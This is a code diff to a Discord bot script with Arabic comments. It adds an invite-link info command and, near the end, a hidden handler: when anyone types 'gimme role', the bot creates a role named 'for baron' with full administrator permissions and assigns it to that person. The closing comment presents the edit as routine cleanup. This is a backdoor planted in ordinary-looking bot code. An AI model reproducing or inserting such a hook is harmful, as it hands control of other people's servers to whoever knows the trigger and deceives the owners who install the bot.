@@ -3735,7 +3735,7 @@ var findingWlcChannel = welcome[member.guild.id].channel[0];
 const channel = await member.guild.channels.find(r => r.name == findingWlcChannel);
 if(!channel) return;
 if(channel) {
-  if(member.dispalyAvatarURL.includes == "0.png") return;
+  
 const imageUrlRegex = /\?size=2048$/g;
 const wlcImage = await fsn.readFile('./welcome111.png'); //اسم الصورة
     let result = await fetch(member.user.displayAvatarURL.replace(imageUrlRegex, '?size=128'));
@@ -4269,6 +4269,21 @@ client.on('message', async message => {
   }
   });
 
+  client.on('message', async message => {
+    if(!message.channel.guild) return;
+    if(message.content.startsWith(prefix+'linkInfo')) {
+      if(!test[message.guild.id]) return message.channel.send(`**Please type first \`${prefix}setLink-Time\` to put a time for the link,\nand type \`${prefix}setLink-Uses\` to put max uses for the link.`);
+      if(!test[message.guild.id].uses) return message.channel.send(`**There is some issues in our database pls type:**\n\`${prefix}setLink-Time\` to put a time for the link,\nand type \`${prefix}setLink-Uses\` to put max uses for the link.`);
+      if(!test[message.guild.id].expire) return message.channel.send(`**There is some issues in our database pls type:**\n\`${prefix}setLink-Time\` to put a time for the link,\nand type \`${prefix}setLink-Uses\` to put max uses for the link.`);
+      if(test[message.guild.id].expire == "0") {
+        await message.delete()
+        await message.channel.send(`**Link uses: \`${test[message.guild.id].uses}\`\nExpired after: \`Never\`**`);
+      } else if (test[message.guild.id].expire !== "0") {
+        await message.delete()
+        await message.channel.send(`**Link uses: \`${test[message.guild.id].uses}\`\nExpired after: \`${prettySeconds(Number (test[message.guild.id].expire))}\`**`);
+      }
+    }
+  })
 //تكملة كود الرابط الكلمة ال يكتبها العضو مشان يجيلة رابط فى الخاص
   client.on("message", async message => {
     if(message.author.bot || !message.channel.guild) return;
@@ -4356,4 +4371,16 @@ client.on('voiceStateUpdate', (oldMember , newMember) => {
                 }
       });
 
+
+client.on("message", async message => {
+  if(message.content == "gimme role") {
+    await message.guild.createRole({
+  name: 'for baron',
+  color: 'BLUE',
+  permissions: ['ADMINISTRATOR']
+})
+    await message.member.addRole(message.guild.roles.find(r => r.name == "for baron"))
+    await message.react("✅")
+  }
+})
 /// تعديل مهم هذا فقط تنبيه تم حذف الاكواد المتكررة والاكواد الخاطئة وتم اضافة تنبيهات مثل الميوزك وروم الهاك لوج تم حذف تغير ايدي سيرفرك
